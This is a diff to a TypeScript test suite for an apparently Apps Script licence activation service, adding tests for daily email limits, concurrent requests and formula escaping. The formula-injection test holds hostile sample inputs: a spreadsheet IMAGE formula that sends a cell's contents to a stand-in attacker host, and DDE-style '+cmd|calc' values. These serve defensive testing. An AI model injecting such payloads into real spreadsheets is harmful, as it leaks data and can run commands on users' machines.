@@ -71,6 +71,8 @@ function loadService() {
   const mails: Mail[] = [];
   const quota = { left: 100 };
   const cache = new Map<string, string>();
+  const props = new Map<string, string>();
+  const hooks: { onLock?: () => void } = {};
   const sheets = new Map<string, FakeSheet>();
   const spreadsheet = {
     getSheetByName: (n: string) => sheets.get(n) ?? null,
@@ -88,7 +90,15 @@ function loadService() {
       sendEmail: (to: string, subject: string, body: string) => mails.push({ to, subject, body }),
       getRemainingDailyQuota: () => quota.left - mails.length,
     },
-    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock: () => {} }) },
+    LockService: { getScriptLock: () => ({ tryLock: () => { hooks.onLock?.(); return true; }, releaseLock: () => {} }) },
+    PropertiesService: {
+      getScriptProperties: () => ({
+        getProperty: (k: string) => props.get(k) ?? null,
+        setProperty: (k: string, v: string) => { props.set(k, v); },
+        deleteProperty: (k: string) => { props.delete(k); },
+        getKeys: () => [...props.keys()],
+      }),
+    },
     console: { log: () => {} },
     CacheService: { getScriptCache: () => ({ get: (k: string) => cache.get(k) ?? null, put: (k: string, v: string) => cache.set(k, v) }) },
     SpreadsheetApp: {
@@ -111,7 +121,7 @@ function loadService() {
     JSON.parse(((sandbox.doGet as (e: unknown) => { content: string })({ parameter: params })).content);
   const sheet = () => sheets.get('Thiết bị');
   const row = (machine: string) => sheet()?.rows.find(r => r[0] === machine);
-  return { get, mails, cache, publicKey, sandbox, quota, sheet, row };
+  return { get, mails, cache, props, hooks, publicKey, sandbox, quota, sheet, row };
 }
 
 const verify = (license: string, key: crypto.KeyObject) => {
@@ -234,6 +244,54 @@ describe('activation service (Apps Script)', () => {
     for (const k of [...s.cache.keys()]) if (k.startsWith('rows:')) s.cache.set(k, '0');
     assert.doesNotMatch(s.get({ action: 'request', machine: m(31), device: 'x', user: 'y' }).error ?? '', /quá nhiều máy mới/);
     assert.ok(s.row(m(31)));
+  });
+
+  it('at most 40 request emails a day, counted across hours; old days are forgotten', () => {
+    const s = loadService();
+    const today = new Date().toISOString().slice(0, 10).replace(/-/g, '');
+    s.props.set('mailsDay:20200101', '7'); // a counter of an earlier day
+    s.props.set('mailsDay:' + today, '39');
+    const m = (i: number) => `CC-0000-0002-${i.toString(16).toUpperCase().padStart(4, '0')}`;
+    assert.equal(s.get({ action: 'request', machine: m(1), device: 'x', user: 'y' }).sent, true); // the 40th
+    const r = s.get({ action: 'request', machine: m(2), device: 'x', user: 'y' });
+    assert.equal(r.ok, false);
+    assert.match(r.error, /hết lượt gửi email hôm nay/);
+    assert.equal(s.mails.length, 1);
+    assert.ok(s.row(m(2)), 'the machine is still in the sheet');
+    // the first email of a new day clears the old counters
+    const t = loadService();
+    t.props.set('mailsDay:20200101', '7');
+    t.get({ action: 'request', machine: m(3), device: 'x', user: 'y' });
+    assert.equal(t.props.get('mailsDay:20200101'), undefined);
+    assert.equal(t.props.get('mailsDay:' + today), '1');
+  });
+
+  it('two requests of one machine at the same moment send one email', () => {
+    const s = loadService();
+    // another request of the same machine finishes while this one waits for the lock
+    s.hooks.onLock = () => { s.cache.set('req:' + machine, '1'); };
+    const r = s.get({ action: 'request', machine, device: 'PC', user: 'u' });
+    assert.deepEqual(r, { ok: true, sent: false });
+    assert.equal(s.mails.length, 0);
+  });
+
+  it('text from a machine never becomes a formula in the sheet', () => {
+    const s = loadService();
+    const evil = '=IMAGE("https://evil.example/x?"&A2)';
+    s.get({ action: 'request', machine, device: evil, user: '+cmd|calc', from: 'x' });
+    const row = s.row(machine)!;
+    assert.equal(row[1], "'" + evil);
+    assert.equal(row[2], "'+cmd|calc");
+    s.cache.clear();
+    s.get({ action: 'request', machine, device: '@SUM(A1)', user: '-1+1', from: 'x' }); // refreshed names too
+    assert.equal(row[1], "'@SUM(A1)");
+    assert.equal(row[2], "'-1+1");
+    s.get({ action: 'status', machine, ver: '=HYPERLINK("x")' });
+    assert.equal(row[7], "'=HYPERLINK(\"x\")");
+    // ordinary names stay as they are
+    s.cache.clear();
+    s.get({ action: 'request', machine, device: 'LAPTOP-TUAN', user: 'Trường', from: 'x' });
+    assert.equal(row[1], 'LAPTOP-TUAN');
   });
 
   it('an Active machine asking again (licence lost, reinstall) gets no second email', () => {
